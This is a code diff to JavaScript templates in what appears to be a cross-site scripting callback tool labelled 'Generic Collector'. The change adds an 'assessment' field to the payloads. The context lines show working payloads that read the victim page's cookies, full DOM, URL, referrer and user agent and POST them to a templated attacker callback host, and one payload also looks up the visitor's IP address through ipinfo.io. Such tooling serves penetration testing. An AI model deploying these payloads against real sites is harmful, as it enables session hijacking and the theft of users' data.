@@ -34,7 +34,8 @@ function capture() {
     var javascript_name = "Generic Collector: IP Address"
     var uri = document.URL;
     var referrer = document.referrer;
-  var payload = "{{payload}}"
+    var payload = {{payload}};
+    var assessment = {{assessment}};
             $.ajax({
                 url: 'http://ipinfo.io',
                 dataType: 'jsonp',
@@ -49,6 +50,7 @@ function capture() {
                             referrer: referrer,
                             javascript_name: javascript_name,
                             data: stuff.ip,
+                            assessment: assessment
                         }
                     }).done(function(respond) {
                         console.log(respond);
@@ -69,6 +71,7 @@ function capture(){
           var cookies = document.cookie;
           var dom = document.documentElement.outerHTML;
           var payload = {{payload}};
+          var assessment = {{assessment}};
         $.ajax({
                 type: "POST",
                 url: "{{callback_protocol}}://{{hostname}}/callbacks",
@@ -78,7 +81,8 @@ function capture(){
                   referrer: referrer,
                   cookies: cookies,
                   user_agent: user_agent,
-                  dom: dom
+                  dom: dom,
+                  assessment: assessment
                   }
           }).done(function (respond) {
             console.log(respond);
@@ -199,6 +203,7 @@ var Base64Binary = {
           var cookies = document.cookie;
           var dom = document.documentElement.outerHTML;
           var payload = {{payload}};
+          var assessment = {{assessment}};
             $.ajax({
                 type: "POST",
                 url: "{{callback_protocol}}://{{hostname}}/callbacks",
@@ -209,7 +214,8 @@ var Base64Binary = {
                   referrer: referrer,
                   cookies: cookies,
                   user_agent: user_agent,
-                  dom: dom
+                  dom: dom,
+                  assessment: assessment
               }
           }).done(function (respond) {
             console.log(respond);
